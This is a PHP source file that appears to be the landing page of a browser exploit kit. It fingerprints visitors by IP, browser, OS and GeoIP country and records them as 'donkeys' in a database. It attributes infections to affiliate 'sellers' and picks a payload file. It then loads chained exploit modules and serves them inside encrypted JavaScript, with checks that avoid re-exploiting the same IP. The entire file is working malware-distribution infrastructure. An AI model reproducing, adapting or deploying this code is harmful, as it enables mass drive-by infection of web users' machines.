<?php

//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
include("./secure/config.php");
include("./secure/javascript.php");
include("./secure/browser.php");
include("./secure/shellcode.php");
include("./secure/geoip.php");
mysql_connect($config['MysqlHost'], $config['MysqlUser'], $config['MysqlPassword']) or die("Could not connect to mysql server.");
mysql_select_db($config['MysqlDbname']) or die("Could not select database.");


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (isset($_GET['get_ajax']) AND $_GET['get_ajax'] == "1"){
	if ($row = mysql_fetch_array(mysql_query("SELECT `id` FROM `donkeys` WHERE `ip` = INET_ATON('" . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . "')"))){
		echo "1";
	} else {
		echo "0";
	}
	exit();
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
$gi = geoip_open("./secure/GeoIP.dat", GEOIP_STANDARD);
$country = geoip_country_id_by_addr($gi, $_SERVER['REMOTE_ADDR']);
geoip_close($gi);
$UAinfo = Browser::identification(false, false, false);
if (strlen($UAinfo['browser']) < 2){
	$UAinfo['browser'] = "OTHER";
}
$seller_id = 0;
$file = $config['DefaultFile'];
$exps = unserialize($config['Exploits']);


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (isset($_GET['s'])){
	if ($row = mysql_fetch_array(mysql_query("SELECT `id`, `file`, `exploits` FROM `sellers` WHERE `hash` = '" . mysql_real_escape_string($_GET['s']) . "'"))){
		$seller_id = $row['id'];
		$file = $row['file'];
		$exps = unserialize($row['exploits']);
	}
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if ($file == 0){
	$files_array = array();
	$filesdir = scandir("./secure/files");
	for ($i = 0; $i < count($filesdir); $i++){
		if ($filesdir[$i] != "." AND $filesdir[$i] != ".."){
			$files_array[] = $filesdir[$i];
		}
	}
	$file = $files_array[rand(0, (count($files_array)-1))];
}



//$_SERVER['REMOTE_ADDR'] = rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255) . "." . rand(1, 255);
//echo "<pre>" . print_r($UAinfo, true) . "</pre><br>country: " . $country . "<br>seller: " . $seller_id . "<br>file: " . $file . "<br>exploits: " . print_r($exps, true);



//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
if (!mysql_query("INSERT `donkeys` (`ip`, `seller`, `browser`, `browser_version`, `os`, `os_version`, `country`, `file`) VALUES (INET_ATON('" . $_SERVER['REMOTE_ADDR'] . "'), " . $seller_id . ", '" . $UAinfo['browser'] . "', '" . mysql_real_escape_string($UAinfo['browser_version']) . "', '" . $UAinfo['platform'] . "', '" . $UAinfo['platform_version'] . "', " . $country . ", " . $file . ")")){
	if (strlen($config['DoubleIpRedirect']) > 0){
		mysql_close();
		header("Location: " . $config['DoubleIpRedirect']);
		exit();
	}
	include("./secure/templates/exploits_doubleip.php");
	exit();
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
$exploits = array();
$exps_fnames = array();
unset($expname);
for ($i = 0; $i < count($exps); $i++){
	include("./secure/exploits/" . str_replace("/", "", str_replace("\\", "", $exps[$i])) . ".php");
	if (isset($expname)){
		$exps_fnames[] = $expname;
		unset($expname);
	}
}
for ($i = 0; $i < count($exploits); $i++){
	$exploits[$i] = str_replace("%NextExploit%", (isset($exps_fnames[$i+1]) ? $exps_fnames[$i+1] : 'Complete') . "();", $exploits[$i]);
}


//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
$CONTENT = "
<script language='JavaScript'>
<!--
" . JavaScript::encrypt('
function Complete(){
	setTimeout(\'location.href = "' . ((strlen($config['FinishRedirect']) > 0) ? $config['FinishRedirect'] : 'about:blank') . '\', 2000);
}

' . (($config['AjaxCheckBeforeExploit']) ? '

function CheckIP(){
	var req = null;
	try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) {
		try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {
			try { req = new XMLHttpRequest(); } catch(e) {}
		}
	}
	if (req == null) return "0";
	req.open("GET", "' . $_SERVER['PHP_SELF'] . '?get_ajax=1&r="+Math.random(), false);
	req.send(null);
	if (req.responseText == "1"){
		return true;
	} else {
		return false;
	}
}
' : '') . implode("\n", $exploits) . '

' . (isset($exps_fnames[0]) ? $exps_fnames[0] : "Complete")  . '();

', $config['CryptSignature']) . "
//-->
</script>
<noscript></noscript>
";





//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
//*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@*@
include("./secure/templates/exploits_page.php");
mysql_close();

?>